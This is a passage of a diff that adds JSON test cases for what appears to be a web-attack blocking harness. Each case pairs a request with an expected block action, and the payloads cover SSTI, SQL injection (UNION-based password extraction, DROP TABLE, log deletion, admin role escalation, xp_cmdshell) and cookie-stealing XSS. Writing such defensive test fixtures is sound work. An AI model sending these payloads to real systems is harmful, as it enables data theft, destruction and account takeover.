+  },
+  {
+    "id": "ATK-VAR-199",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/greeting?name=${7*7}&variation=200",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-200",
+    "category": "SSTI",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/page?tpl={{config.items()}}&variation=201",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-201",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/search?q=' OR '1'='1&variation=202",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-202",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/users?id=1 UNION SELECT null, username, password FROM users--&variation=203",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-203",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/items?cat=tech'; DROP TABLE products;--&variation=204",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-204",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/login?v=205",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "username": "admin' --",
+      "password": "pwd"
+    }
+  },
+  {
+    "id": "ATK-VAR-205",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/login?v=206",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "username": "admin' OR 1=1 #",
+      "password": "pwd"
+    }
+  },
+  {
+    "id": "ATK-VAR-206",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/query?sort=name; EXEC xp_cmdshell('dir')&variation=207",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-207",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/filter?val=%27%20OR%201%3D1--&variation=208",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-208",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/check?code=' or 1=1&variation=209",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-209",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/orders?status=active' AND 1=1--&variation=210",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-210",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/data?v=211",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "filter": "1' or 'a'='a"
+    }
+  },
+  {
+    "id": "ATK-VAR-211",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/records?filter=test' union select 1,2,3--&variation=212",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-212",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; INSERT INTO users VALUES ('hacker','pwd')&variation=213",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-213",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; DELETE FROM logs WHERE 1=1&variation=214",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-214",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; UPDATE users SET role='admin' WHERE id=5&variation=215",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-215",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/search?q=test%27%20and%201%3D1&variation=216",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-216",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/comments?msg=<script>alert('XSS')</script>&variation=217",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-217",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/profile?v=218",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "bio": "<img src=x onerror=alert(document.cookie)>"
+    }
+  },
+  {
+    "id": "ATK-VAR-218",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/feedback?text=javascript:alert(1)&variation=219",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-219",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/view?name=<svg onload=alert('XSS')>&variation=220",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-VAR-220",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/items?v=221",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "desc": "<iframe src=javascript:document.cookie>"
+    }
+  }
+]
